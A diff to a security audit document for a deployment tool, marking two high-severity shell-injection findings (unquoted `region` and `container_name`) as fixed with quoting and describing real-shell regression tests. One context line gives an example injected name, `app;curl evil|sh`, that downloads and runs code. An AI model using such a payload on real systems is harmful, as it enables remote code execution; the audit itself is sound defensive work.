@@ -35,8 +35,8 @@ orchestration and has far weaker test coverage than the Rust core.
 
 | # | Severity | Area | One line |
 |---|----------|------|----------|
-| R1 | High | stdlib / registry | `region` interpolated unquoted into an ECR login subshell (injection) |
-| R2 | High | stdlib / runtime | `runtime_exec_cmd(name, command)` interpolates both args unquoted (injection) |
+| R1 | High | stdlib / registry | ✅ resolved — `region` interpolated unquoted into an ECR login subshell (injection) |
+| R2 | High | stdlib / runtime | ✅ resolved — `runtime_exec_cmd(name, command)` interpolated `container_name` unquoted (injection) |
 | R3 | High | secrets | ✅ resolved — `ENC[...]` tokens are never decrypted at runtime — raw ciphertext reaches commands |
 | R4 | High | engine / sim | probe classifier treats "command not found" as "container absent" |
 | R5 | High | engine / ssh | no command timeout or SSH keep-alive — a hung command blocks the deploy (and the lock) forever |
@@ -67,6 +67,17 @@ backticks, and `\` stay live (the sibling occurrence on the line above *is*
 as the deploy user.
 **Fix:** `sh_quote(region)`, or validate the region against `^[a-z0-9-]+$`.
 
+**Resolved (2026-07-10).** `region` is now spliced in as its own `sh_quote()`'d
+(single-quoted) segment, adjacent to the surrounding double-quoted segments —
+shell concatenates adjacent quoted strings with no separator, and single quotes
+keep the region's contents fully literal regardless of `$`, backticks, `;`, or
+embedded `"`. Covered by a real end-to-end test that runs the exact constructed
+command through a real shell (`local_exec`, live — not dry-run) with a region
+crafted to break out of the old unquoted context, and asserts the injected
+`touch` never ran (`tests/shell_injection.rs`). Verified by reverting the fix
+and confirming the test fails (the marker file IS created) against the
+original code.
+
 ### R2 — High — `runtime_exec_cmd(container_name, command)` quotes neither argument
 `lib/runtime.rhai:146`. **Verified.**
 
@@ -80,6 +91,12 @@ not. Any caller passing a user-influenced name (`app;curl evil|sh`) gets remote
 code execution. `command` is a documented raw escape hatch, but `container_name`
 should be quoted.
 **Fix:** `sh_quote(container_name)`.
+
+**Resolved (2026-07-10).** `container_name` is now `sh_quote()`'d, matching
+`docker_exec`'s existing contract; `command` remains an intentional raw
+escape hatch (see R28 below). Covered by the same real-shell-execution test
+approach as R1 (`tests/shell_injection.rs`), also verified to fail against
+the original code.
 
 ### R17 — Low — Caddy admin-API service names are shell-quoted but not URL-encoded
 `lib/caddy.rhai` (lines 144, 167, 181, 192). A `service` containing `/` or `../`
